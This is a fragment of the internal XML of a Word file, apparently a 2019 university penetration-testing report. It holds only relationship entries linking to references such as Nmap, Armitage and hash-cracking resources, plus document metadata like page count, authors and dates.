Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.lifewire.com/net-use-command-2618096" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.fastandeasyhacking.com/manual" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer4.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.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nmap.org/book/man.html" TargetMode="External"/><Relationship Id="rId52"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hyperlink" Target="https://www.dionach.com/blog/active-directory-password-auditing-part-2-cracking-the-hashes" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://intranet.abertay.ac.uk/library/digital-skills/mylearningspace/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes" Target="endnotes.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.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hyperlink" Target="https://nmap.org/nsedoc/categories/vuln.html" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://support.microsoft.com/en-gb/help/243330/well-known-security-identifiers-in-windows-operating-systems" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/"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www.airbus.com/newsroom/press-releases/en/2018/01/airbus-2018-price-list-press-release.html" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:sez@abertay.ac.uk"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d_m\AppData\Roaming\Microsoft\Templates\Report%20design%20(blank).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Sixth Edition" Version="6"/>
</file>

<file path=customXml/itemProps1.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2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{7A3B0813-F372-4B29-AFAB-597A12CDEC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design (blank)</Template>
  <TotalTime>1289</TotalTime>
  <Pages>55</Pages>
  <Words>11300</Words>
  <Characters>64410</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>536</Lines>
  <Paragraphs>151</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="2" baseType="variant">
      <vt:variant>
        <vt:lpstr>Title</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="1" baseType="lpstr">
      <vt:lpstr/>
    </vt:vector>
  </TitlesOfParts>
  <Company>UAD</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>75559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Colin M</dc:creator>
  <cp:lastModifiedBy>Peter Captain</cp:lastModifiedBy>
  <cp:revision>22</cp:revision>
  <cp:lastPrinted>2019-12-17T23:55:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-11-15T10:42:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-12-17T23:57:00Z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ies>
</file>